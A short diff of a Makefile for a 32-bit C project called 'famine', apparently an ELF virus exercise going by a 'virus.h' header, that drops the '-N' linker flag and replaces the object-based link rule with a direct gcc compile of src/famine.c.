@@ -2,7 +2,7 @@ NAME =			famine
 
 CC =			gcc
 
-FLAGS =			 -nostdlib -m32 -Wall -Wextra -N
+FLAGS =			 -nostdlib -m32 -Wall -Wextra
 
 HEADERS =		-I ./inc
 
@@ -23,8 +23,8 @@ OBJ_PATHS :=	$(addprefix $(OBJ_DIR),$(OBJ_PATHS))
 
 all: $(NAME)
 
-$(NAME): $(OBJ_PATHS)
-	@$(CC) -m32  $(OBJ_PATHS) $(HEADERS) -o $(NAME)
+$(NAME):
+	@gcc src/famine.c -o famine -nostdlib -m32 -Wall -Wextra
 	@echo "\033[2K\r\033[0;32m[OK] \033[0m       \033[0;33m $(NAME) created ✅\033[0m"
 
 $(OBJ_PATHS): $(OBJ_DIR)%.o: $(SRC_DIR)%.c ./inc/famine.h ./inc/virus.h
